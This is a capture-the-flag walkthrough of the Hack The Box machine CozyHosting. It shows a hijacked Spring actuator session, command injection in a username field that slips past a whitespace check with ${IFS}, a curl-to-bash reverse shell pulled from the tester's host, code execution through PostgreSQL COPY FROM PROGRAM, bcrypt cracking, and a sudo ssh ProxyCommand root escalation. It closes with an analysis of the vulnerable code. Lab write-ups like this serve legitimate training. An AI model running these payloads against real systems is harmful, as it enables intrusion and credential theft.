# nmap
```
# Nmap 7.93 scan initiated Fri Sep  8 11:53:57 2023 as: nmap -p- -Pn -sC -sV -T4 -oN nmap.txt -vvvv 10.10.11.230
Warning: 10.10.11.230 giving up on port because retransmission cap hit (6).
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up, received user-set (0.28s latency).
Scanned at 2023-09-08 11:53:57 EDT for 2492s
Not shown: 65420 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        REASON      VERSION
22/tcp    open     ssh            syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp    open     http           syn-ack     nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  8 12:35:29 2023 -- 1 IP address (1 host up) scanned in 2492.56 seconds
```

# Web Enumeration
Using ffuf, we are able to find that http://cozyhosting.htb has exposed actuator endpoints

```
/admin                  [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 511ms]
/actuator               [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 370ms]
/actuator/mappings      [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 466ms]
/actuator/env           [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 639ms]
/error                  [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 270ms]
/%61dmin                [Status: 401, Size: 99, Words: 1, Lines: 1, Duration: 274ms]
/admin                  [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 268ms]
/l;urette               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 320ms]
/login                  [Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 276ms]
/logout                 [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 352ms]
```

Navigating to http://cozyhosting.htb/actuator, we are able to find the list actuator endpoints that are exposed on this site

```
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 09 Sep 2023 04:30:03 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 634

{
    "_links": {
        "self": {
            "href": "http://localhost:8080/actuator",
            "templated": false
        },
        "sessions": {
            "href": "http://localhost:8080/actuator/sessions",
            "templated": false
        },
        "beans": {
            "href": "http://localhost:8080/actuator/beans",
            "templated": false
        },
        "health": {
            "href": "http://localhost:8080/actuator/health",
            "templated": false
        },
        "health-path": {
            "href": "http://localhost:8080/actuator/health/{*path}",
            "templated": true
        },
        "env": {
            "href": "http://localhost:8080/actuator/env",
            "templated": false
        },
        "env-toMatch": {
            "href": "http://localhost:8080/actuator/env/{toMatch}",
            "templated": true
        },
        "mappings": {
            "href": "http://localhost:8080/actuator/mappings",
            "templated": false
        }
    }
}
```

However, when we navigate to http://cozyhosting.htb/actuator/sessions, we can see a list of sessions. Among them, there is a session belonging to kanderson

```
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 09 Sep 2023 04:50:06 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 148

{
    "120074FB77C31C93529753263A93B192": "kanderson",
    "FA2AE22CE8C9ABEC15B715C1F751246E": "UNAUTHORIZED",
    "B4C2FF4C8C9F654E7471962DB8AB1ED3": "UNAUTHORIZED"
}
```

Using the value of the session that we have obtained from kanderson, we can use Burp Suite's match and replace function to replace the session key of our unauthorized session with that of the session key of kanderson to authenticate to the admin portal. In essence, we are modifying the cookie such that it becomes the following:

```
Cookie: JSESSIONID=120074FB77C31C93529753263A93B192
```

In the admin portal, we are able to find a POST request to the ```/executessh``` endpoint that could be used to connect the server to the Cozy Scanner. However, we realize that even if we use the IP address of cozyhosting.htb and kanderson as the username, we are unable to connect Cozy Scanner to our host as the host verification failed.


```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=120074FB77C31C93529753263A93B192
Upgrade-Insecure-Requests: 1

host=10.10.11.230&username=kanderson
```

Typically, for the server to connect to the Cozy Scanner via SSH, the backend would require to use os commands to execute code. This means that this endpoint might be vulnerable to OS command injection or SSTI vulnerabilities. Using ```host=10.10.11.230&username=%23%7b3%2a3%7d``` as the payload, we are able to trigger an error message that tells us that the endpoint is vulnerable to OS command injection on the username parameter

```
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 09 Sep 2023 06:56:44 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```

Using the following request, we are able to successfully execute the ```id``` command.

```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=120074FB77C31C93529753263A93B192
Upgrade-Insecure-Requests: 1



host=10.10.11.230&username=`id`
```

However, when we attempt to execute the ```ls -la``` command, we receive an error that whitespaces are not allowed. We also notice that we are unable to execute the ```ls``` command as there are more than 1 line in the output and so, it cannot be properly displayed in the response.  By sending the follow request, we realize that we are able to do a ```wget``` command on our server.

```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=120074FB77C31C93529753263A93B192
Upgrade-Insecure-Requests: 1



host=10.10.11.230&username=`wget${IFS}9http://10.10.16.6:3000/test.txt`
```

When trying the reverse shell payloads, it seems that the one liners payloads do not work properly. As such we will write our reverse shell into ```shell.sh``` file and afterwards, we will use a ```curl``` command to trigger the reverse shell.

```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=5C36E145B98D7DA8235AE0D328240013
Upgrade-Insecure-Requests: 1



host=test&username=`curl${IFS}http://10.10.16.6:4000/shell.sh|bash`
```

# Privilege Escalation
However, we are only the ```app``` user and we do not have the permissions to read the user.txt file

```
app@cozyhosting:/app$ cat /home/josh/user.txt
cat /home/josh/user.txt
cat: /home/josh/user.txt: Permission denied
app@cozyhosting:/app$ 
```

In the current directory, we are able to find a jar file. We will then copy the jar to our local directory to inspect the contents of the jar file. 

```
app@cozyhosting:/app$ ls -a
ls -a
.  ..  cloudhosting-0.0.1.jar
```

In htb.cloudhosting.scheduled.FakeUser.java, we are able to find the crednetials for the kanderson user previously. Unfortunately, this user is not able to obtain SSH access to our target server.

```
package htb.cloudhosting.scheduled;

import java.io.IOException;
import java.util.concurrent.TimeUnit;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.support.WebContentGenerator;

@Component
/* loaded from: cloudhosting-0.0.1.jar:BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class */
public class FakeUser {
    @Scheduled(timeUnit = TimeUnit.MINUTES, fixedDelay = 5)
    public void login() throws IOException {
        System.out.println("Logging in user ...");
        Runtime.getRuntime().exec(new String[]{"curl", "localhost:8080/login", "--request", WebContentGenerator.METHOD_POST, "--header", "Content-Type: application/x-www-form-urlencoded", "--data-raw", "username=kanderson&password=MRdEQuv6~6P9", "-v"});
    }
}
```

However, we were able to find another set of credentials for psql in BOOT-INF/classes/application.properties

```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Checking the services on our localhost using ```netstat```, we are also able to find an active port 5432 on our localhost

```
netstat -anto | grep "5432"
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:5432          127.0.0.1:39588         ESTABLISHED keepalive (6570.34/0/0)
tcp        0      0 127.0.0.1:5432          127.0.0.1:37884         ESTABLISHED keepalive (6583.48/0/0)
tcp        0      0 127.0.0.1:5432          127.0.0.1:37888         ESTABLISHED keepalive (6585.81/0/0)
tcp        0      0 127.0.0.1:5432          127.0.0.1:39572         ESTABLISHED keepalive (6564.07/0/0)
tcp        0      0 127.0.0.1:5432          127.0.0.1:48066         ESTABLISHED keepalive (6557.73/0/0)
tcp        0      0 127.0.0.1:5432          127.0.0.1:60250         ESTABLISHED keepalive (6572.04/0/0)
tcp        0      0 127.0.0.1:5432          127.0.0.1:60252         ESTABLISHED keepalive (6578.16/0/0)
tcp        0      0 127.0.0.1:5432          127.0.0.1:39576         ESTABLISHED keepalive (6566.84/0/0)
tcp        0      0 127.0.0.1:5432          127.0.0.1:48076         ESTABLISHED keepalive (6559.71/0/0)
tcp        0      0 127.0.0.1:5432          127.0.0.1:37876         ESTABLISHED keepalive (6582.04/0/0)
```

Using the set of credentials, we are able to authenticate to psql

```
app@cozyhosting:/app$ psql -U postgres -h localhost -W
psql -U postgres -h localhost -W
Password: Vg&nvzAQ7XxR

psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# 
```

Since we are able to gain access to the psql database, we will be able to execute commands as the psql user

```
postgres=# DROP TABLE IF EXISTS cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'id';
COPY cmd_exec FROM PROGRAM 'id';
COPY 1
postgres=# SELECT * from cmd_exec;
SELECT * from cmd_exec;
                               cmd_output                               
------------------------------------------------------------------------
 uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)
(1 row)
```

However, we notice that we are still unable to read the user flag as the postgres user due to insufficient permissions

```
postgres=# DROP TABLE IF EXISTS cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'cat /home/josh/user.txt';
COPY cmd_exec FROM PROGRAM 'cat /home/josh/user.txt';
ERROR:  program "cat /home/josh/user.txt" failed
DETAIL:  child process exited with exit code 1
```

Listing all the database using ```\l```, we are able to find a list of databases

```
postgres=# \l
\l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

Now, we will switch to the cozyhosting database

```
postgres=# \c cozyhosting
\c cozyhosting
Password: Vg&nvzAQ7XxR

SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
```

Listing the tables, we are able to find 2 tables, hosts and users

```
cozyhosting=# \dt
\dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
```

Viewing the users tables, we are able to obtain 2 hashes

```
select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

Next, we will then use john to crack the hashes

```
┌──(kali㉿kali)-[~/Desktop/cozyhosting]
└─$ john --wordlist=rockyou.txt hash                                 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:24 0.01% (ETA: 2023-09-11 15:08) 0g/s 83.06p/s 167.6c/s 167.6C/s harris..florence
manchesterunited (?)
```

Using the password we can then obtain access into the SSH server as josh

```
┌──(kali㉿kali)-[~/Desktop/cozyhosting]
└─$ ssh josh@10.10.11.230
josh@10.10.11.230's password: 
...

Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
josh@cozyhosting:~$ 
```

# Obtaining user flag

```
josh@cozyhosting:~$ cat /home/josh/user.txt
<user flag>
```

# Privilege Escalation to root
Using ```sudo -l```, we realize that josh is able to execute ```SSH``` with root permissions

```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Using GTFOBins, we realize that we are able to spwan an interactive root shell using ```sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x```

```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

# Obtaining root flag
```
# cat /root/root.txt
<root flag>
```
# Analyzing OS command injection
In the htb.cloudhosting.compliance.ComplianceService.java code, we are able to find the line that cause the vulnerability. In the line below, the script executes a bash command ```/bin/bash -c "ssh -o ConnectTimeout=1 <username>@<host>"```

```
Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", String.format("ssh -o ConnectTimeout=1 %s@%s", username, host)});
```

However, before executing the bash command the script will first validate the host and the username that we have supplied. For the host validation, it is much more difficult to execute an OS command injection as it goes through a very strict regex matching. On the other hand, it is much easier for the username parameter as it merely just checks if the username contains whitespace. We can also easily bypass the whitespace validation using ```${IFS}```

```
//validateHost
Pattern.compile("^(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\\.?$")
//validateUserName
if (username.contains(" ")) {
    throw new IllegalArgumentException("Username can't contain whitespaces!");
}

```
